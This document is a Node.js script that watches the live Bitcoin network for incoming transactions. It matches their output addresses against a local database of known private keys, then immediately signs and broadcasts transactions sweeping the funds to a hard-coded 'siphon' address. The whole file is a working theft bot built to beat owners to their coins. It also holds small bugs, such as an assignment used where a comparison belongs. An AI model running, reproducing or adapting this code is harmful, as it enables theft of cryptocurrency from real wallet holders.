#!/usr/bin/env node
var bitcore = require('bitcore-lib');
var p2p = require('bitcore-p2p');
var Pool = p2p.Pool;
var Messages = p2p.Messages;
var Networks = bitcore.Networks;
var Transaction = bitcore.Transaction;
var async = require('async');
var levelup = require('level')
var db = levelup('./addressdb', { valueEncoding: 'json'})
process.on('SIGINT', function() {
  console.log("\nGracefully shutting down from SIGINT (Ctrl+C)")
  console.log("\nClosing database...")
  db.close()
  console.log("\nExiting")
  process.exit()
});

var siphon = "1FUCK1oBgCmbbBjxaybjbEmvkh8RCUdgBx";
// Add specific peers to connect to, such as your local bitcoind.
// Set dnsSeed to false and maxSize to 'peers.length' to only connect to these.
var myPeers = [{
  ip : { v4: '127.0.0.1' }
}];
// The number of peers you want to connect to.
var size = 50;

var sendTx = function(pool, peer, tx, t) {
  var messages = new Messages();
  // Send the siphon tx back to the incoming peer.
  var transaction = messages.Transaction(t);
  peer.sendMessage(transaction);
  // Forward the incoming tx to the pool followed by the siphon tx.
  var forward = messages.Transaction(tx);
  pool.sendMessage(forward);
  pool.sendMessage(transaction);
};

var handleTx = function(pool, peer, tx) {
  async.reduce(tx.transaction.outputs, {
    "utxos" : new Array(),
    "keys" : new Array(),
    "amount" : 0,
    "n" : 0
    }, function(memo, out, next) {
      if (out.script.isPublicKeyHashOut()) {
        db.get(out.script.toAddress(), function (err, result) {
          if (!(err)) {
            var key = new bitcore.PrivateKey(result);
            memo.keys.push(key);
            var utxo = new Transaction.UnspentOutput({
              "txid" : tx.transaction.id,
              "vout" : memo.n,
              "address" : out.script.toAddress(),
              "script" : out.script,
              "satoshis" : out.satoshis,
              "output" : out
            });
            memo.utxos.push(utxo);
            memo.amount += out.satoshis;
          };
          memo.n++;
          next(null, memo);
        });
      };
    },
    function(err, results) {
      if (results.amount >= 20000) {
        var t = new Transaction()
          .from(results.utxos)
          .to(siphon, results.amount - 10000)
          .sign(results.keys);
        if (t.getSerializationError()) {
          console.log(t.getSerializationError());
        } else {
          console.log("IN: " + tx.transaction.id +  " " + results.amount + "\nOUT: " + t.id);
          sendTx(pool, peer, tx.transaction, t);
        };
      } else if (results.amount >= 2000) {
        var t = new Transaction()
          .from(results.utxos)
          .to(siphon, Math.ceil(results.amount /2))
          .sign(results.keys);
        if (t.getSerializationError()) {
          console.log(t.getSerializationError());
        } else {
	  console.log("IN: " + tx.transaction.id +  " " + results.amount + "\nOUT: " + t.id);
          sendTx(pool, peer, tx.transaction, t);
        };
      };
    }
  );
};

var pool = new Pool({
  network: Networks.livenet,
  dnsSeed: true,
  maxSize: size,
  addrs: myPeers
});

pool.on('peerready', function(peer, addr) {
  console.log("Connect: " + peer.version, peer.subversion, peer.bestHeight, peer.host);
});

pool.on('peerdisconnect', function(peer, addr) {
  console.log("Disconnect: " + peer.version, peer.subversion, peer.bestHeight, peer.host);
});

pool.on('peerinv', function(peer, inv) {
  if ( inv.typeName = 'TX' ) {
    var messages = new Messages();
    var message = new messages.GetData(inv.inventory);
    peer.sendMessage(message);
  }
});

pool.on('peertx', function(peer, tx) {
  handleTx(pool, peer, tx);
});

pool.connect();
